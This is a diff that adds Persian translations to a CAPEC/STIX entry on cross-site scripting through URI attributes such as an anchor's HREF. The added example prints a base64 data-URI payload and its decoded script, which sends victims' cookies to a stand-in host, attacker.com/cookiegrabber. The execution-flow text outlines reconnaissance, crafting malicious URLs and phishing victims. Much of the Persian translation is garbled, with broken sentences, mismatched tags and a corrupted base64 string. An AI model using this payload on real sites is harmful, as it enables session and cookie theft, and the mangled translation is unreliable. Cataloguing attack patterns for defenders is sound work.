@@ -9,30 +9,38 @@
                 {
                     "external_id": "CAPEC-244",
                     "source_name": "capec",
-                    "url": "https://capec.mitre.org/data/definitions/244.html"
+                    "url": "https://capec.mitre.org/data/definitions/244.html",
+                    "source_name_fa": "capec"
                 },
                 {
                     "external_id": "CWE-83",
                     "source_name": "cwe",
-                    "url": "http://cwe.mitre.org/data/definitions/83.html"
+                    "url": "http://cwe.mitre.org/data/definitions/83.html",
+                    "source_name_fa": "cwe"
                 },
                 {
                     "description": "OWASP Testing Guide (v2), The Open Web Application Security Project (OWASP)",
                     "external_id": "REF-70",
                     "source_name": "reference_from_CAPEC",
-                    "url": "http://www.owasp.org/index.php/Testing_for_Cross_site_scripting"
+                    "url": "http://www.owasp.org/index.php/Testing_for_Cross_site_scripting",
+                    "description_fa": "راهنمای تست OWASP (v2)، پروژه امنیتی برنامه وب باز (OWASP)",
+                    "source_name_fa": "مرجع_از_CAPEC"
                 },
                 {
                     "description": "Google Cross-Site Scripting HOWTO article, Google",
                     "external_id": "REF-96",
                     "source_name": "reference_from_CAPEC",
-                    "url": "https://code.google.com/archive/p/doctype/wikis/ArticleXSSInUrlAttributes.wiki"
+                    "url": "https://code.google.com/archive/p/doctype/wikis/ArticleXSSInUrlAttributes.wiki",
+                    "description_fa": "Google Cross-Site Scripting مقاله HOWTO، Google",
+                    "source_name_fa": "مرجع_از_CAPEC"
                 },
                 {
                     "description": "WASC Threat Classification 2.0, 2010, The Web Application Security Consortium (WASC)",
                     "external_id": "REF-72",
                     "source_name": "reference_from_CAPEC",
-                    "url": "http://projects.webappsec.org/Cross-Site+Scripting"
+                    "url": "http://projects.webappsec.org/Cross-Site+Scripting",
+                    "description_fa": "WASC Threat Classification 2.0، 2010، کنسرسیوم امنیت برنامه های وب (WASC)",
+                    "source_name_fa": "مرجع_از_CAPEC"
                 }
             ],
             "id": "attack-pattern--c77ec906-0371-482e-8b14-a4a41b6b5b74",
@@ -72,6 +80,29 @@
                 ],
                 "Non-Repudiation": [
                     "Gain Privileges"
+                ],
+                "Access_Control_fa": [
+                    "مکانیسم حفاظت دور زدن"
+                ],
+                "Accountability_fa": [
+                    "کسب امتیازات"
+                ],
+                "Authentication_fa": [
+                    "کسب امتیازات"
+                ],
+                "Authorization_fa": [
+                    "اجرای دستورات غیرمجاز (اجرای کد دلخواه)",
+                    "کسب امتیازات",
+                    "مکانیسم حفاظت دور زدن"
+                ],
+                "Confidentiality_fa": [
+                    "داده ها را بخوانید"
+                ],
+                "Integrity_fa": [
+                    "داده ها را اصلاح کنید"
+                ],
+                "Non-Repudiation_fa": [
+                    "کسب امتیازات"
                 ]
             },
             "x_capec_domains": [
@@ -91,11 +122,24 @@
                 "Ability to send HTTP request to a web application"
             ],
             "x_capec_skills_required": {
-                "Medium": "To inject the malicious payload in a web page"
+                "Medium": "To inject the malicious payload in a web page",
+                "Medium_fa": "برای تزریق بار مخرب در یک صفحه وب"
             },
             "x_capec_status": "Draft",
             "x_capec_typical_severity": "High",
-            "x_capec_version": "3.9"
+            "x_capec_version": "3.9",
+            "description_fa": "حمله ای از این نوع از توانایی اکثر مرورگرها برای تفسیر \"داده\"، \"جاوا اسکریپت\" یا دیگر طرح های URI به عنوان متغیرهایی محتوای اجرایی سمت مشتری استفاده می کند. این حمله شامل ارسال یک URI مخرب در یک ویژگی تگ لنگر HREF یا هر ویژگی مشابه دیگری در سایر تگ‌های HTML است. برای مثال، چنین URI مخربی حاوی یک محتوای HTML کدگذاری شده base64 با بار اسکریپت بین سایتی تعبیه شده است. حمله زمانی اجرا می شود که مرورگر محتوای مخرب را تفسیر می کند، به عنوان مثال، زمانی که قربانی روی پیوند مخرب کلیک می کند.",
+            "name_fa": "XSS Targeting URI Placeholders",
+            "x_capec_example_instances_fa": [
+                "<xhtml:p>داده های بارگذاری زیر:</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\">text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja 2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk1xshtmlPCg=>\n               <xhtml:p>نماینده HTML کدگذاری شده base64 است و از طرح URI داده برای تحویل آن به مرورگر استفاده می کند.</xhtml:p>\n               <xhtml:p>بار رمزگشایی شده قطعه کد HTML زیر است:</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\"><html><xhtml:div style=\"margin-left:1em;\"><body><xhtml:div style=\"margin-left:1em;\"><script><xhtml:div style=\"margin-left:1em;\">var img = new Image();img.src = \"http://attacker.com/cookiegrabber?\"+ encodeURIcomponent(document.cookies);</xhtml:div>\n                        </script></xhtml:div>\n                     </body></xhtml:div>\n                  </html></xhtml:div>\n               <xhtml:p>برنامه‌های وب که ورودی‌های کنترل‌شده توسط کاربر را می‌گیرند و آنها را بدون اعتبارسنجی مناسب در URI HTML منعکس می‌کنند، در معرض خطر چنین حمله‌ای هستند.</xhtml:p>\n               <xhtml:p>یک حریف می‌تواند بار قبلی را که در یک مکان‌نمای URI قرار می‌گیرد (به عنوان مثال در ویژگی HREF تگ لنگر) تزریق کند:</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\"><a href=\"INJECTION_POINT\">پیوند من</a></xhtml:div>\n               <xhtml:p> هنگامی که قربانی روی پیوند کلیک کرد، مرورگر محتوا را از بارگذاری رمزگشایی و اجرا می کند. این منجر به اجرای حمله اسکریپت بین سایتی می شود.</xhtml:p>"
+            ],
+            "x_capec_execution_flow_fa": "<h2> جریان اجرا </h2><div><h3>کاوش</h3><ol><li> <p> <b>برنامه را برای ورودی‌های قابل کنترل کاربر بررسی کنید: </b>با استفاده از یک مرورگر یا یک ابزار خودکار، دشمن همه پیوندها و اقدامات عمومی را در یک وب‌سایت دنبال می‌کند. آنها همه پیوندها، فرم‌ها، منابع دسترسی و سایر نقاط ورود بالقوه را برای برنامه وب ضبط می‌کنند.</p></li><table><tbody><tr><th>تکنیک‌ها</th></tr><tr><td>از ابزار spidering برای دنبال کردن و ضبط همه پیوندها استفاده کنید. هر پیوندی را که شامل پارامترهایی در URL است یادداشت ویژه داشته باشید.</td></tr><tr><td>از یک ابزار پراکسی برای ضبط همه پیوندهای بازدید شده در طول پیمایش دستی برنامه وب استفاده کنید. هر پیوندی که شامل پارامترهایی در URL است را یادداشت ویژه داشته باشید. پیمایش دستی از این نوع اغلب برای شناسایی فرم هایی که فرم های متد GET هستند به جای فرم های POST ضروری است.</td></tr><tr><td>از یک مرورگر برای کاوش دستی وب سایت و تجزیه و تحلیل نحوه ساخت آن استفاده کنید. بسیاری از افزونه‌های مرورگر برای تسهیل تجزیه و تحلیل یا خودکار کردن کشف URL در دسترس هستند.</td></tr></tbody></table></ol></div><div><h3>آزمایش</h3><ol><li> <p> <b>کاوشگر نقاط ورودی بالقوه برای آسیب‌پذیری XSS منعکس‌شده را شناسایی کرد: </b>دزدی به عنوان نقطه‌های ورودی در مرحله \"Eplorex\" از مرحله \"Eplore\" استفاده می‌کند. بارهای مختلف به عنوان طرح‌های URI داده با استفاده از پایه قالب‌بندی می‌شوند تا مشخص شود آیا یک نقطه ورودی واقعاً یک آسیب‌پذیری را نشان می‌دهد یا نه و مشخص می‌کند که تا چه حد می‌توان از آسیب‌پذیری مورد سوء استفاده قرار گرفت. در صورت امکان، رشته‌های کاوشگر حاوی یک شناسه منحصربه‌فرد برای ردیابی رشته تزریق‌شده به نقطه ورودی هستند.</td></tr><tr><td>از یک ابزار پراکسی برای ثبت نتایج ورودی دستی پروب‌های XSS در URL‌های شناخته‌شده استفاده کنید.</td></tr></tbody></table><li> <p> <b>Craft چه آدرس اینترنتی مخربی دارد. در برابر XSS آسیب پذیر هستند، آنها یک URL مخرب حاوی اکسپلویت XSS ایجاد می کنند. حریف می‌تواند اهداف زیادی داشته باشد، از سرقت شناسه‌های جلسه، کوکی‌ها، اعتبارنامه‌ها و محتوای صفحه از قربانی.</p></li><table><tbody><tr><th>تکنیک‌ها</th></tr><tr><td>یک پارامتر URL را تغییر دهید تا شامل یک بار مخربی باشد که به‌عنوان یک طرح URI قالب‌بندی شده است، یا از آن استفاده کنید به‌عنوان زمانی که URIsche وب به URI برگردانده شد، به وب بازگشت داده شد. برنامه.</td></tr><tr><td>اطلاعات جمع‌آوری‌شده از اسکریپت مخرب را به یک نقطه پایانی راه دور ارسال کنید.</td></tr></tbody></table></ol></div><div><h3>Exploit</h3><ol><li> <p> <b>قربانی را دریافت کنید تا روی URL کلیک کند: </b>برای اینکه حمله مخرب دسترسی موفقیت‌آمیز داشته باشد، نیاز به دسترسی موفقیت‌آمیز به قربانی دارد. URL.</p></li><table><tbody><tr><th>تکنیک ها</th></tr><tr><td>یک ایمیل فیشینگ حاوی URL مخرب برای قربانی ارسال کنید. این را می توان در یک ابرپیوند پنهان کرد تا نشانی اینترنتی کامل نشان داده نشود، که ممکن است باعث شک شود.</td></tr><tr><td>نشانی اینترنتی مخرب را در یک انجمن عمومی قرار دهید، جایی که بسیاری از قربانیان ممکن است به طور تصادفی روی پیوند کلیک کنند.</td></tr></tbody></table></ol></div>",
+            "x_capec_prerequisites_fa": [
+                "نرم افزار سرویس گیرنده هدف باید اجازه اسکریپت نویسی مانند جاوا اسکریپت را بدهد و اجازه دهد محتوای اجرایی با استفاده از طرح URI داده تحویل داده شود."
+            ],
+            "x_capec_resources_required_fa": [
+                "امکان ارسال درخواست HTTP به برنامه تحت وب"
+            ]
         }
     ],
     "type": "bundle"
